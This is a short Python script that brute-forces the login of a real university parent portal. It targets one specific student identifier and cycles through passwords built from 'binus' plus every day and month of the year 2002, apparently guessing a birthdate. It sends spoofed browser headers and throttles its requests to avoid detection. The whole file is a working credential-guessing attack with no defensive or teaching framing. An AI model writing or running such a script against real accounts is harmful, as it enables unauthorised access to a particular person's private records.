import requests
import time

s = requests.session()

for i in range(2002,2003):
    for j in range(1,13):
        for k in range(1,32):
            resp = s.post("https://parent.binus.ac.id/",data={"identifier":"2440074571","password":"binus%02d%02d%d"%(k,j,i),"_wp_http_referer":"/","_wpnonce":"ca74de0614"},headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "max-age=0",
                "Host": "parent.binus.ac.id",
                "Origin": "https://parent.binus.ac.id",
                "Referer": "https://parent.binus.ac.id/",
                "sec-ch-ua": "Not A;Brand;v=99, Chromium;v=90, Microsoft Edge;v=90",
                "sec-ch-ua-mobile": "?0",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.49"
            })
            print(resp.url,"binus%02d%02d%d"%(k,j,i),resp.status_code)
            time.sleep(0.5)
        time.sleep(3)
    time.sleep(1)
    
